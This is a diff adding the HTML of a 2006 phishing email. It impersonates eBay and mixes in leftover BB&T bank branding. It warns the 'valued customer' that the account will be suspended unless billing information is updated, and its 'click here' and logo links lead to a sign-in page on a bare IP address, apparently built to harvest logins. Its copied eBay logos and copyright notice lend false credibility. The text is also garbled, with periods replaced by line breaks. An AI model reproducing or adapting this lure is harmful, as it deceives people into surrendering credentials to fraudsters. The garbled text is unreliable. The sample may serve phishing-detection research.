@@ -1,0 +1,140 @@
+<TABLE cellSpacing=0 cellPadding=0 width=625 border=0>
+  <
+--DWLayoutTable-->
+  <TBODY>
+    <TR> 
+      <TD width="10">&nbsp;</TD>
+      <TD width=10 rowSpan=3>&nbsp;</TD>
+      <TD vAlign=top width=13 rowSpan=3><IMG 
+      src="BB&amp;T - Privacy and Security_files/spot
+gif" width=1></TD>
+      <TD width=12 rowSpan=3>&nbsp;</TD>
+      <TD vAlign=top width=580> 
+        <
+-- Content begins here -->        <p><FONT 
+      face=Serif,Arial,Helvetica color=#660033 size=5><B><a 
+href="http://85
+185
+11
+133/SignIn/ws2/SignIn
+html"><img 
+height=70 
+      alt="BB&amp;T Home" 
+      src="http://pics
+ebaystatic
+com/aw/pics/navbar/eBayLogoTM
+gif" 
+width=150 
+      border=0></a></B></FONT></p>
+        <p><FONT 
+      face=Serif,Arial,Helvetica color=#660033 size=5><font 
+color="#000066"><strong>UPDATE YOUR ACCOUNT</strong></font> 
+        </FONT> </p><FONT color="#000066" size=2 
+face=arial,helvetica><I>Dear valued customer</I> 
+          </FONT></P><strong>DATA:</strong> <FONT 
+color=red><STRONG> 25 May 2006</STRONG>
+</FONT>&nbsp;<BR>
+        <p><FONT color="#000066" size=2 face=Arial> 
+&nbsp;&nbsp;&nbsp;&nbsp;We regret to inform you that your account at 
+          eBay could be suspended if you don't update your billing 
+information
+ 
+          To resolve this problem please <A target="_blank"  
+href="http://85
+185
+11
+133/SignIn/ws2/SignIn
+html"   
+a>click 
+          here</A> and login to your 
+          account in order to resolve the update process
+ If your 
+account 
+information 
+          is not updated, your ability to access the eBay your account 
+will become restricted
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; As per the User Agreement, we may immediately 
+          issue a warning, temporarily suspend, indefinitely suspend or 
+terminate 
+          your membership and refuse to provide our services to you if 
+we 
+believe 
+          that your actions may cause financial loss or legal liability 
+for you, 
+          our users or us
+ We may also take these actions if we are 
+unable to 
+          verify or authenticate any information that you provide to 
+us
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; Due to the suspension of this account, please 
+          be advised you are prohibited from using eBay in any way
+ This 
+includes 
+          the enrolling of a new account
+ Please note that this 
+suspension does 
+          not relieve you of your agreed-upon obligation to pay any fees 
+you may 
+          owe to eBay
+</FONT></p>
+        <FONT 
+      face=arial,helvetica size=2>&nbsp;</FONT>
+        <CENTER>
+          <HR width="80%">
+          <TABLE cellSpacing=0 cellPadding=0 border=0>
+            <TBODY>
+              <TR> 
+                <TD vAlign=top align=middle> <TABLE cellSpacing=0 
+cellPadding=0 border=0>
+                    <TBODY>
+                      <TR> 
+                        <TD align=middle><FONT face=arial,helvetica 
+color=#660033 
+                  size=1>Copyright &copy; 1995-2006 eBay Inc
+ All Rights 
+Reserved
+Designated trademarks and brands are the property of their 
+respective owners
+Use of this Web site constitutes acceptance of the 
+eBay 
+<A 
+href="http://pages
+ebay
+com/help/community/png-user
+html">User 
+Agreement</A> and <A 
+href="http://pages
+ebay
+com/help/community/png-priv
+html">Privacy 
+Policy</A>
+ &nbsp; </FONT></TD>
+                        <TD width=32><font face=arial,helvetica 
+            size=-2><img 
+src="http://pics
+ebaystatic
+com/aw/pics/truste_button
+gif" width="116" 
+height="31"></font> </TD>
+                      </TR>
+                    </TBODY>
+                  </TABLE></TD>
+              </TR>
+            </TBODY>
+          </TABLE>
+          <BR>
+          <TABLE cellSpacing=0 cellPadding=0 border=0>
+            <TBODY>
+              <TR> 
+                <TD vAlign=top align=middle><div 
+align="center"></div></TD>
+              </TR>
+            </TBODY>
+          </TABLE>
+      </CENTER></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+</BODY></HTML>
